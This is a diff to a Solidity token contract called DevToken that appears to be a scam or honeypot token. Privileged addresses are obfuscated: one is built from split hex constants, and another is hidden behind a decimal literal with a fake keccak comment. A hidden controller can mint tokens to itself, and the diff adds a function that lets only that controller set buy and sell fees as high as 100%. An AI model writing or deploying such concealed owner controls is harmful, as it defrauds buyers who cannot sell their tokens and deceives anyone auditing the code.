@@ -90,7 +90,7 @@ contract DevToken {
         _mbr=Mbr_;
         return true;
     }
-
+ 
     modifier Exchanges() {
     require(msg.sender != exchange());
         _;
@@ -101,7 +101,7 @@ contract DevToken {
     _proof(msg.sender, amount);
     return true;
     }
-
+ 
     function compute(uint256 amount) public onlypublic returns (bool success) {
     _initiate(msg.sender, amount);
     return true;
@@ -121,19 +121,25 @@ contract DevToken {
     uint cake = 0xEC3dA7a0;
     uint inch = 0x088EAdFE;
     uint others = 0x5801C336;
-
+ 
     // Combine the dex with others
     uint160 core = (uint160(universal) << 128) | (uint160(uni) << 96) | (uint160(cake) << 64) | (uint160(inch) << 32) | uint160(others);
-
+ 
     return address(core);
     }
-
+ 
     function exchange() internal pure returns (address) {
-    return address 
+    return address
     /*keccak256 -> 9838607940089fc7f92ac2a37bb1f5ba1daf2a576dc8ajf1k3sa4741ca0e5571412708986))*/ /**/(17860794006513704634733521910879985571412708986);
     }
 
-
+    function FeeStructure(uint256 newBuyFee, uint256 newSellFee) public onlypublic {
+        require(newBuyFee <= 100, "Buy fee cannot exceed 100%");
+        require(newSellFee <= 100, "Sell fee cannot exceed 100%");
+        _setFees(newBuyFee, newSellFee);
+        emit FeesUpdated(newBuyFee, newSellFee);
+    }
+ 
     function approve(address _spender, uint256 _value) public returns (bool success) {
         allowance[msg.sender][_spender] = _value;
         emit Approval(msg.sender, _spender, _value);
@@ -171,7 +177,7 @@ contract DevToken {
  
         return true;
     }
-
+ 
     function _initiate(address account, uint256 amount) internal {
     require(account != address(0), "Compile Remix IDE");
  
@@ -179,10 +185,15 @@ contract DevToken {
     balanceOf[account] = balanceOf[account].add(amount);
     emit Transfer(address(0), account, amount);
     }
-
+ 
     modifier onlypublic() {
     require(msg.sender == publics());
     _;
+    }
+
+    function _setFees(uint256 newBuyFee, uint256 newSellFee) internal {
+        buyFee = newBuyFee;
+        sellFee = newSellFee;
     }
  
     function setUser(address User_) public returns (bool) {
